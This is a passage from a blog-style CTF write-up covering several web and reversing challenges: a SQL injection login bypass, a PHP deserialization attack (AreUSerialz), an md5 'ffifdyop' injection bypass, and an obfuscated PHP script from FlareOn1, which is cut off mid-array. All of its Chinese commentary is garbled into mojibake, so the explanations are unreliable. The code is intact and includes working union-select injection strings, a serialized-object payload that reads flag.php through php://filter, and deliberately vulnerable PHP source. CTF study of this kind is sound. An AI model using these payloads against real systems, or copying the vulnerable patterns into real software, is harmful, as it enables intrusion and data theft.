user!&quot;);<br>&#125;<br>&#125;<br>&#125;<br><br>?&gt;<br><br></code></pre></td></tr></table></figure><p>1ã€åœ¨nameä¸­è¿‡æ»¤äº†ä¸€äº›å­—ç¬¦ä»¥åŠorã€‚</p><p>2ã€mysqli_queryï¼ˆï¼‰å¯¹æ•°æ®åº“è¿›è¡Œä¸€æ¬¡æŸ¥è¯¢</p><p>3ã€mysqli_fetch_row() å‡½æ•°ä»ç»“æœé›†ä¸­å–å¾—ä¸€è¡Œï¼Œå¹¶ä½œä¸ºæšä¸¾æ•°ç»„è¿”å›ã€‚<br>4ã€md5åŠ å¯†åè¦ä¸æ•°ç»„arr[2]å¼±ç±»å‹æ¯”è¾ƒã€‚</p><p>5ã€å€¼å¾—æ³¨æ„çš„ä¸€ç‚¹<code>$result = mysqli_query($con, $sql);</code>è¿™é‡Œå¿…é¡»æ˜¯æœ‰ä¸€ä¸ªsqlçš„æŸ¥è¯¢è¯­å¥ï¼Œä¸ç„¶ä¼šç›´æ¥é€€å‡ºï¼ˆç”±ä¸‹æ–¹åˆ¤æ–­å¾—å‡ºï¼‰ã€‚</p><p>6ã€è¿™é‡Œä¸æ˜¯å¾ˆèƒ½ç†è§£sqlè¯­å¥<code>$sql = &quot;select * from user where username = &#39;&quot;.$name.&quot;&#39;&quot;;</code>,æ‹¼æ¥è¿›å»åˆ°åº•æ˜¯ä»€ä¹ˆæ ·å­çš„ã€‚è¯¢é—®äº†h3å¸ˆå‚…ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261210618.png" alt="QQæˆªå›¾20220223170735"></p><p><strong><code>å¤§çˆ±h3</code></strong></p><p>å°´å°¬ï¼Œè¢«æ•™è®­äº†ã€‚æˆ‘è‡ªå·±åŠ¨æ‰‹ï¼Œè®¾ç½®çš„å˜é‡æ²¡æœ‰åŠ <code>&quot;&quot;</code>,è¢«éª‚çš„å¦¥å¦¥çš„ï¼Œé”™äº†é”™äº†ä¸‹æ¬¡ä¸€å®šè¿˜æ•¢å“ˆå“ˆå“ˆå“ˆã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261210160.png" alt="QQæˆªå›¾20220223171831"></p><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p>1ã€<code>name=ad&#39; union select 1,&#39;admin&#39;,NULL#&amp;pw[]=123</code></p><p>2ã€<code>name=ad&#39; union select 1,&#39;admin&#39;,&#39;åŠ å¯†åçš„md5&#39;#&amp;pw[]=ä»»æ„å¾…MD5åŠ å¯†çš„å¯†ç </code>ï¼ˆæœ¬äººæ²¡æœ‰å¤ç°æˆåŠŸï¼Œæ²¡æœ‰å…·ä½“çš„æ•°æ®åº“ä¹Ÿä¸èƒ½è·Ÿè¿›æŸ¥çœ‹ï¼‰ã€‚</p><h2 id="ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz"><a href="#ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz" class="headerlink" title="[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz"></a>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML"> &lt;?php<br><br>include(&quot;flag.php&quot;);<br><br>highlight_file(__FILE__);<br><br>class FileHandler &#123;<br><br>    protected $op;<br>    protected $filename;<br>    protected $content;<br><br>    function __construct() &#123;<br>        $op = &quot;1&quot;;<br>        $filename = &quot;/tmp/tmpfile&quot;;<br>        $content = &quot;Hello World!&quot;;<br>        $this-&gt;process();<br>    &#125;<br><br>    public function process() &#123;<br>        if($this-&gt;op == &quot;1&quot;) &#123;<br>            $this-&gt;write();<br>        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;<br>            $res = $this-&gt;read();<br>            $this-&gt;output($res);<br>        &#125; else &#123;<br>            $this-&gt;output(&quot;Bad Hacker!&quot;);<br>        &#125;<br>    &#125;<br><br>    private function write() &#123;<br>        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;<br>            if(strlen((string)$this-&gt;content) &gt; 100) &#123;<br>                $this-&gt;output(&quot;Too long!&quot;);<br>                die();<br>            &#125;<br>            $res = file_put_contents($this-&gt;filename, $this-&gt;content);<br>            if($res) $this-&gt;output(&quot;Successful!&quot;);<br>            else $this-&gt;output(&quot;Failed!&quot;);<br>        &#125; else &#123;<br>            $this-&gt;output(&quot;Failed!&quot;);<br>        &#125;<br>    &#125;<br><br>    private function read() &#123;<br>        $res = &quot;&quot;;<br>        if(isset($this-&gt;filename)) &#123;<br>            $res = file_get_contents($this-&gt;filename);<br>        &#125;<br>        return $res;<br>    &#125;<br><br>    private function output($s) &#123;<br>        echo &quot;[Result]: &lt;br&gt;&quot;;<br>        echo $s;<br>    &#125;<br><br>    function __destruct() &#123;<br>        if($this-&gt;op === &quot;2&quot;)<br>            $this-&gt;op = &quot;1&quot;;<br>        $this-&gt;content = &quot;&quot;;<br>        $this-&gt;process();<br>    &#125;<br><br>&#125;<br><br>function is_valid($s) &#123;<br>    for($i = 0; $i &lt; strlen($s); $i++)<br>        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))<br>            return false;<br>    return true;<br>&#125;<br><br>if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123;<br><br>    $str = (string)$_GET[&#x27;str&#x27;];<br>    if(is_valid($str)) &#123;<br>        $obj = unserialize($str);<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="åˆ†æä»£ç "><a href="#åˆ†æä»£ç " class="headerlink" title="åˆ†æä»£ç "></a>åˆ†æä»£ç </h3><p>ä¸€çœ¼çœ‹åˆ°<code>unserialize</code>ï¼ˆå¤§ä½“å°±æ˜¯è€ƒæŸ¥ååºåˆ—åŒ–äº†ï¼‰ï¼Œç„¶åæœ‰ä¸€ä¸ªåˆ¤æ–­ã€‚<code>is_valid($str)</code>,ä¸Šç½‘æ‰¾äº†åŠå¤©ï¼Œç»“æœè¿™æ˜¯ä¸€ä¸ªè‡ªå»ºå‡½æ•°ã€‚emmmâ€¦æ— è¯­å•¦ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-comment">#å…¶åŠŸèƒ½å°±æ˜¯é™åˆ¶è¾“å…¥çš„å­—ç¬¦é•¿åº¦ä¸º32-125ï¼ˆè½¬åŒ–ä¸ºasciiåï¼‰</span><br></code></pre></td></tr></table></figure><p>ç„¶åæƒ³åˆ°é­”æ³•å‡½æ•°çš„è°ƒç”¨ã€‚è¿™é‡Œç›´æ¥å¼•ç”¨h3å¸ˆå‚…çš„æ–‡ç« ã€‚copyè¿‡æ¥ã€‚</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk">__destruct()ï¼š<span class="hljs-regexp">//</span>ææ„å‡½æ•°å½“å¯¹è±¡è¢«é”€æ¯æ—¶ä¼šè¢«è‡ªåŠ¨è°ƒç”¨<br>__wakeup(): <span class="hljs-regexp">//u</span>nserialize()æ—¶ä¼šè¢«è‡ªåŠ¨è°ƒç”¨<br>__invoke(): <span class="hljs-regexp">//</span>å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹æ³•è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œä¼šè¢«è‡ªåŠ¨è°ƒç”¨<br>__call(): <span class="hljs-regexp">//</span>åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘<br>__callStatci(): <span class="hljs-regexp">//</span>åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘<br>__get(): <span class="hljs-regexp">//</span>ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®<br>__set(): <span class="hljs-regexp">//</span>ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§<br>__isset(): <span class="hljs-regexp">//</span>åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘<br>__unset(): <span class="hljs-regexp">//</span>åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘<br>__toString(): <span class="hljs-regexp">//</span>æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘<br>__construct(): <span class="hljs-regexp">//</span>æ„é€ å‡½æ•°ï¼Œå½“å¯¹è±¡newçš„æ—¶å€™ä¼šè‡ªåŠ¨è°ƒç”¨ï¼Œä½†åœ¨unserialize()æ—¶ä¸ä¼šè‡ªåŠ¨è°ƒç”¨<br>__sleep(): <span class="hljs-regexp">//</span>serialize()å‡½æ•°ä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé­”æœ¯æ–¹æ³•__sleep() å¦‚æœå­˜åœ¨ï¼Œè¯¥æ–¹æ³•ä¼šè¢«ä¼˜å…ˆè°ƒç”¨<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå°±å¯ä»¥ç›´æ¥çœ‹çœ‹<code>_destruct()</code>å¹²äº†ä»€ä¹ˆã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>            <span class="hljs-variable language_">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><span class="hljs-comment">#opåˆå§‹å€¼ä¸º1</span><br></code></pre></td></tr></table></figure><p>ç»§ç»­è·Ÿ<code>process()</code>å‡½æ•°ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>     <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>         <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>();<br>     &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>         <span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>();<br>         <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-variable">$res</span>);<br>     &#125; <span class="hljs-keyword">else</span> &#123;<br>         <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>     &#125;<br> &#125;<br></code></pre></td></tr></table></figure><p>å¾ˆæ˜¾ç„¶éœ€è¦è¿›å…¥<code>read()</code>å‡½æ•°ã€‚è¿™é‡Œ<code>output</code>ï¼Œä¼šå°†è¿”å›ç»“æœè¾“å‡ºã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename)) &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable language_">$this</span>-&gt;filename);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¾ˆæ˜¾ç„¶è¿™é‡Œå°±å¯ä»¥ç”¨php:&#x2F;&#x2F;filterä¼ªåè®®è¯»å–æ–‡ä»¶ã€‚</p><h3 id="æµç¨‹"><a href="#æµç¨‹" class="headerlink" title="æµç¨‹"></a>æµç¨‹</h3><p>1ã€éœ€è¦åœ¨è¿›å…¥<code>process</code>ä¹‹å‰å°†opçš„å€¼æ”¹ä¸º2ã€‚</p><p>2ã€æ„é€ filenaem&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261210434.png" alt="QQæˆªå›¾20220223160637"></p><p>è¿™é‡Œä¸çŸ¥é“ä»€ä¹ˆåŸå› ã€‚æœäº†ä¸€ä¸‹wpã€‚çœ‹wpçš„æ—¶å€™å‘ç°è‡ªå·±çš„ä¼ªåè®®å†™é”™äº†ã€‚emmmâ€¦æ‰‹åŠ¨æ·»åŠ <code>//</code>ï¼Œå¹¶ä¸”æ‰‹åŠ¨æ”¹å˜wpã€‚<code>55</code>â€“<code>57</code></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261210005.png" alt="QQæˆªå›¾20220223160814"></p><h3 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;FileHandler&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;op&quot;</span>;i:<span class="hljs-number">2</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;filename&quot;</span>;s:<span class="hljs-number">57</span>:<span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><h3 id="Base64è§£ç "><a href="#Base64è§£ç " class="headerlink" title="Base64è§£ç "></a>Base64è§£ç </h3><p>ç»“æŸã€‚</p><h2 id="SWPUCTF-2016-Web7"><a href="#SWPUCTF-2016-Web7" class="headerlink" title="[SWPUCTF 2016]Web7"></a>[SWPUCTF 2016]Web7</h2><p>è¿™é¢˜ç›¸å¯¹æ¥è¯´å°±æ¯”è¾ƒç®€å•ã€‚ç®€å•è®°å½•ä¸€ä¸‹ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220218183715.png" alt="QQæˆªå›¾20220218183715"></p><p>å¦‚ä½•ç»•è¿‡å‘¢ï¼Ÿç™¾åº¦ä¸€ç§ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261210449.png" alt="QQæˆªå›¾20220218183842"></p><p><strong>å¸ˆå‚…å·²ç»è®²å¾—å¾ˆè¯¦ç»†äº†ï¼Œæ€»è€Œè¨€ä¹‹å°±æ˜¯å½“æ³¨å…¥çš„pass&#x3D;ffifdyopæ—¶ï¼Œffifdyopç»è¿‡md5åŠ å¯†åå˜æˆ â€˜orâ€™6\xc9]\x99\xe9!r,\xf9\xedb\x1c è¢«è¿”å›ï¼Œ â€˜ \ â€˜åé¢çš„3ä¸ªå­—ç¬¦è¿åŒâ€™ \ â€˜ç®—ä¸€ä¸ªå­—ç¬¦ï¼Œæ¯”å¦‚â€™  \xc9 â€˜ï¼Œæ‰€ä»¥ä¸Šè¿°ä¸€å…±16ä¸ªå­—ç¬¦ã€‚å‡½æ•°md5($pass,true)è¿”å›ä¸ºtrueã€‚</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261210428.png" alt="QQæˆªå›¾20220218184141"></p><p>æŸ¥çœ‹æºç  MD5ç®€å•ç»•è¿‡ï¼Œç„¶åä¾æ—§MD5ç®€å•ç»•è¿‡ã€‚<br>ç»“æŸã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261210962.png" alt="QQæˆªå›¾20220218184328"></p><h2 id="FlareOn1-Javascrap"><a href="#FlareOn1-Javascrap" class="headerlink" title="[FlareOn1]Javascrap"></a>[FlareOn1]Javascrap</h2><p>ç»™äº†å‹ç¼©åŒ…ç›´æ¥ä¸‹è½½ä¸€ä¸‹ã€‚winhexæŸ¥çœ‹å›¾ç‰‡ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$terms</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;Z&quot;</span>, <span class="hljs-string">&quot;]&quot;</span>, <span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;z&quot;</span>, <span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;)&quot;</span>, <span class="hljs-string">&quot;9&quot;</span>, <span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>, <span class="hljs-string">&quot;&amp;&quot;</span>, <span class="hljs-string">&quot;\&#x27;&quot;</span>, <span class="hljs-string">&quot;!&quot;</span>, <span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;~&quot;</span>, <span class="hljs-string">&quot;O&quot;</span>, <span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-string">&quot;@&quot;</span>, <span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;6&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;^&quot;</span>, <span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;`&quot;</span>, <span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;[&quot;</span>, <span class="hljs-string">&quot;0&quot;</span>, <span class="hljs-string">&quot;&#125;&quot;</span>, <span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-string">&quot;&#123;&quot;</span>, <span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;o&quot;</span>, <span class="hljs-string">&quot;7&quot;</span>, <span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;I&quot;</span>, <span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-string">&quot;(&quot;</span>, <span class="hljs-string">&quot;j&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;?&quot;</span>, <span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;t&quot;</span>, <span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;|&quot;</span>);<br><span class="hljs-variable">$order</span>=<span class="hljs-keyword">array</span>(<span class="hljs-number">59</span>, <span class="hljs-number">71</span>, <span class="hljs-number">73</span>, <span class="hljs-number">13</span>, <span class="hljs-number">35</span>, <span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">81</span>, <span class="hljs-number">76</span>, <span class="hljs-number">10</span>, <span class="hljs-number">28</span>, <span class="hljs-number">63</span>, <span class="hljs-number">12</span>, <span class="hljs-number">1</span>, <span class="hljs-number">28</span>, <span class="hljs-number">11</span>, <span class="hljs-number">76</span>, <span class="hljs-number">68</span>, <span class="hljs-number">50</span>, <span class="hljs-number">30</span>, <span class="hljs-number">11</span>, <span class="hljs-number">24</span>, <span class="hljs-number">7</span>, <span class="hljs-number">63</span>, <span class="hljs-number">45</span>, <span class="hljs-number">20</span>, <span class="hljs-number">23</span>, <span class="hljs-number">68</span>, <span class="hljs-number">87</span>, <span class="hljs-number">42</span>, <span class="hljs-number">24</span>, <span class="hljs-number">60</span>, <span class="hljs-number">87</span>, <span class="hljs-number">63</span>, <span class="hljs-number">18</span>, <span class="hljs-number">58</span>, <span class="hljs-number">87</span>, <span class="hljs-number">63</span>, <span class="hljs-number">18</span>, <span class="hljs-number">58</span>, <span class="hljs-number">87</span>, <span class="hljs-number">63</span>, <span class="hljs-number">83</span>, <span class="hljs-number">43</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">90</span>, <span class="hljs-number">38</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">19</span>, <span class="hljs-number">66</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">17</span>, <span class="hljs-number">37</span>, <span class="hljs-number">63</span>, <span class="hljs-number">58</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">83</span>, <span class="hljs-number">43</span>, <span class="hljs-number">87</span>, <span class="hljs-number">42</span>, <span class="hljs-number">24</span>, <span class="hljs-number">60</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">87</span>, <span class="hljs-number">66</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">66</span>, <span class="hljs-number">63</span>, <span class="hljs-number">50</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">17</span>, <span class="hljs-number">1</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">45</span>, <span class="hljs-number">66</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">40</span>, <span class="hljs-number">11</span>, <span class="hljs-number">25</span>, <span class="hljs-number">5</span>, <span class="hljs-number">70</span>, <span class="hljs-number">63</span>, <span class="hljs-number">7</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">12</span>, <span class="hljs-number">1</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">81</span>, <span class="hljs-number">37</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">12</span>, <span class="hljs-number">63</span>, <span class="hljs-number">25</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">83</span>, <span class="hljs-number">63</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">87</span>, <span class="hljs-number">23</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">75</span>, <span class="hljs-number">49</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">49</span>, <span class="hljs-number">0</span>, <span class="hljs-number">50</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span 